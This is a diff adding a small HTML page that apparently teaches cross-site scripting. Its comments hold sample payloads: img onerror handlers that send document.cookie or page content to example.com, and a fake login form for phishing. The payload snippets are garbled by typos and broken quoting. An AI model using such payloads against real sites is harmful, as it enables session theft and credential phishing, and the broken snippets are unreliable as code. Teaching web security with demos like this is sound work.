@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <div>Welcome <span id="name"></span></div>
+
+    <script>
+      // function to setCookie , mostly this will be set from server
+      function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+        const expires = "expires=" + date.toUTCString();
+        document.cookie = document.cookie =
+          name + "=" + value + ";" + expires + ";path=/";
+      }
+
+      setCookie("exampleCode", "hello", 7);
+    </script>
+
+    <!-- example:- 
+      https://www.example.com?name=<img src=\"does-not-exist\" onerror=\"var img = document.crateElement(\'img\'');
+      img src=\'https://www.example.com?cookie=\'+document.cookie;document.body.appendChild(img);\"
+      />
+      " -->
+
+    <!-- 
+        example- stealing critical information from the user's browser and sending it to the attacker's server.
+        
+        https://www.example.com?name=<img src="does-not-exist" onerror="var myCookie= document.cookie;
+        new image = new Image(); newImage.src='https://www.example.com?fakepage.php?output=${document.body.innerHtml}"/>
+        
+       -->
+
+    <!-- 
+        example:- phishing attack
+
+        
+       <h3>Enter your username and password</h3>
+       <form action="https://www.fakeweb.com/login" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username">
+        <label for="password">Password:</label>
+
+       </form>  
+
+        -->
+
+    <script>
+      const urlParams = new URLSearchParams(window.location.search);
+      const username = urlParams.get("name");
+      document.getElementById("name").innerText = username;
+    </script>
+  </body>
+</html>
